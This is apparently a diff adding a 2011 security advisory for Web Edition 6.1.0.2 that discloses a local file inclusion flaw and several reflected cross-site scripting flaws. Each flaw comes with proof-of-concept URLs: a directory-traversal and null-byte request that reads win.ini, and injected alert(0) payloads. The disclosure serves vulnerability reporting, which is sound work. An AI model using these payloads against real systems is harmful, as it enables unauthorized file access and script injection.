@@ -1,0 +1,52 @@
+------------------------------------------------------------------------
+Software................Web Edition 6.1.0.2
+Vulnerability...........Local File Inclusion
+Threat Level............Critical (4/5)
+Download................http://www.webedition.org
+Vendor Contact Date.....3/13/2011
+Disclosure Date.........3/27/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A local file inclusion vulnerability in Web Edition 6.1.0.2 can be
+exploited to include arbitrary files.
+
+
+--PoC--
+
+http://localhost/webedition/we/include/we_modules/show.php?mod=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+
+------------------------------------------------------------------------
+Software................Web Edition 6.1.0.2
+Vulnerability...........Reflected Cross-site Scripting
+Threat Level............Low (1/5)
+Download................http://www.webedition.org
+Vendor Contact Date.....3/13/2011
+Disclosure Date.........3/27/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A reflected cross-site scripting vulnerability in Web Edition 6.1.0.2
+can be exploited to execute arbitrary JavaScript.
+
+
+--PoC--
+
+http://localhost/webedition/openBrowser.php?url=%22onload=%22alert%280%29
+http://localhost/webedition/we/include/we_modules/shop/edit_shop_editorFrameset.php?bid=%22onload=%22alert%280%29
+http://localhost/webedition/we/include/we_modules/messaging/messaging_show_folder_content.php?we_transaction=%22;}alert%280%29;{//
+http://localhost/webedition/we/include/weTracking/econda/weEcondaImplement.inc.php?we_objectID=&shop_artikelid=%27;alert%280%29;//
